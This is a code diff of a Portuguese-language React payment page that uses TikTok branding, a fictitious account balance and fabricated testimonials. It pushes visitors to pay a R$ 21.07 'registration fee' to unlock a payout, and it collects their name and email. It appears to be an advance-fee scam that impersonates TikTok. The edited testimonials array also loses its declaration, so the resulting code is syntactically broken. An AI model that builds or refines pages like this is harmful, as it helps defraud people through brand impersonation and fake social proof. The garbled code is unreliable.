@@ -2,36 +2,28 @@ import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { CheckCircle2, Star, User } from "lucide-react";
 import tiktokLogo from "@/assets/tiktok-logo.png";
-import testimonial1 from "@/assets/testimonial-1.png";
-import testimonial2 from "@/assets/testimonial-2.png";
-import testimonial3 from "@/assets/testimonial-3.png";
 
 const TAX = 21.07;
-const SALDO = 3834.72;
+const SALDO = 2770.0;
 
 const testimonials = [
-  {
-    name: "Matheus Henrique Santos",
-    text: '"rapazz e nao foi que esse ngc do gol de premios deu boa aqui tbm familia KKKKKK"',
-    avatar: testimonial1,
-  },
-  {
-    name: "Ana Paula Silva",
-    text: '"recebi em menos de 2 minutos, muito rápido! recomendo demais"',
-    avatar: testimonial2,
-  },
-  {
-    name: "Carlos Eduardo",
-    text: '"pensei que era golpe mas recebi certinho, top demais!!"',
-    avatar: testimonial3,
-  },
-];
+{
+  name: "Matheus Henrique Santos",
+  text: '"rapazz e nao foi que esse ngc do gol de premios deu boa aqui tbm familia KKKKKK"'
+},
+{
+  name: "Ana Paula Silva",
+  text: '"recebi em menos de 2 minutos, muito rápido! recomendo demais"'
+},
+{
+  name: "Carlos Eduardo",
+  text: '"pensei que era golpe mas recebi certinho, top demais!!"'
+}];
+
 
 const Pagamento = () => {
-  const savedNome = localStorage.getItem("tiktok_nome") || "";
-  const savedChavePix = localStorage.getItem("tiktok_chave_pix") || "";
-  const [email, setEmail] = useState(savedChavePix.includes("@") ? savedChavePix : "");
-  const [nomeCompleto, setNomeCompleto] = useState(savedNome);
+  const [email, setEmail] = useState("");
+  const [nomeCompleto, setNomeCompleto] = useState("");
 
   const handlePagar = () => {
     // Redirect to actual payment
@@ -51,14 +43,15 @@ const Pagamento = () => {
           <img src={tiktokLogo} alt="TikTok" className="h-8" />
           <div className="rounded-full border-2 border-secondary px-4 py-1.5">
             <p className="text-[10px] text-gray-400 leading-none">Saldo:</p>
-            <p className="text-sm font-bold text-black">R$ {SALDO.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</p>
+            <p className="text-sm font-bold text-black">R$ {SALDO.toFixed(2).replace(".", ",")}</p>
           </div>
         </div>
 
         {/* Info banner */}
-        <div className="rounded-xl bg-black p-4 text-center">
-          <p className="text-sm font-semibold text-white">Confirmação instantânea</p>
-          <p className="text-sm font-semibold text-white">Reembolso em até 2 minutos</p>
+        <div className="rounded-xl bg-secondary p-4 text-center">
+          <p className="text-sm font-semibold text-white">
+            Confirmação instantânea • PIX cai em até 2 minutos
+          </p>
           <div className="flex items-center justify-center gap-1 mt-1">
             <CheckCircle2 className="h-3 w-3 text-white/80" />
             <p className="text-xs text-white/80">Transação Segura</p>
@@ -68,18 +61,18 @@ const Pagamento = () => {
         {/* Product card */}
         <div className="rounded-2xl bg-white border border-gray-200 p-5">
           <div className="flex items-center gap-4 mb-4">
-            <div className="h-14 w-14 rounded-2xl bg-white border border-gray-200 flex items-center justify-center shrink-0">
-              <img src={tiktokLogo} alt="TikTok" className="h-8" />
+            <div className="h-14 w-14 rounded-2xl bg-black flex items-center justify-center shrink-0">
+              <span className="text-2xl">♪</span>
             </div>
             <div>
               <p className="text-sm font-bold text-black">Taxa De Cadastro</p>
               <p className="text-xs text-gray-400">Tiktok ltda</p>
             </div>
           </div>
-          <div className="flex items-center justify-between border-t border-gray-100 pt-3">
-            <span className="text-sm text-gray-500">Total</span>
-            <span className="text-lg font-bold text-black">R$ {TAX.toFixed(2).replace(".", ",")}</span>
-          </div>
+          
+
+
+
         </div>
 
         {/* Identificação */}
@@ -99,8 +92,8 @@ const Pagamento = () => {
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
                 placeholder="Email"
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-black placeholder:text-gray-300 outline-none focus:border-primary"
-              />
+                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-black placeholder:text-gray-300 outline-none focus:border-primary" />
+
             </div>
             <div>
               <label className="text-sm font-semibold text-black block mb-2">Nome completo</label>
@@ -109,8 +102,8 @@ const Pagamento = () => {
                 value={nomeCompleto}
                 onChange={(e) => setNomeCompleto(e.target.value)}
                 placeholder="Nome e sobrenome"
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-black placeholder:text-gray-300 outline-none focus:border-primary"
-              />
+                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-black placeholder:text-gray-300 outline-none focus:border-primary" />
+
             </div>
           </div>
         </div>
@@ -134,8 +127,8 @@ const Pagamento = () => {
         <Button
           onClick={handlePagar}
           disabled={!email.trim() || !nomeCompleto.trim()}
-          className="w-full h-14 rounded-2xl text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground uppercase tracking-wider disabled:opacity-40"
-        >
+          className="w-full h-14 rounded-2xl text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground uppercase tracking-wider disabled:opacity-40">
+
           Pagar
         </Button>
 
@@ -145,28 +138,28 @@ const Pagamento = () => {
 
         {/* Testimonials */}
         <div className="flex gap-4 overflow-x-auto pb-4 -mx-4 px-4">
-          {testimonials.map((t) => (
-            <div key={t.name} className="min-w-[260px] rounded-2xl bg-white border border-gray-200 p-4">
+          {testimonials.map((t) =>
+          <div key={t.name} className="min-w-[260px] rounded-2xl bg-white border border-gray-200 p-4">
               <div className="flex items-center gap-3 mb-2">
-                <div className="h-10 w-10 rounded-full overflow-hidden shrink-0">
-                  <img src={t.avatar} alt={t.name} className="h-full w-full object-cover" />
+                <div className="h-10 w-10 rounded-full bg-gray-200 flex items-center justify-center shrink-0">
+                  <User className="h-5 w-5 text-gray-400" />
                 </div>
                 <div>
                   <p className="text-sm font-bold text-black">{t.name}</p>
                   <div className="flex gap-0.5">
-                    {Array.from({ length: 5 }).map((_, i) => (
-                      <Star key={i} className="h-3 w-3 fill-yellow-400 text-yellow-400" />
-                    ))}
+                    {Array.from({ length: 5 }).map((_, i) =>
+                  <Star key={i} className="h-3 w-3 fill-yellow-400 text-yellow-400" />
+                  )}
                   </div>
                 </div>
               </div>
               <p className="text-xs text-gray-500 leading-relaxed">{t.text}</p>
             </div>
-          ))}
+          )}
         </div>
       </div>
-    </div>
-  );
+    </div>);
+
 };
 
 export default Pagamento;
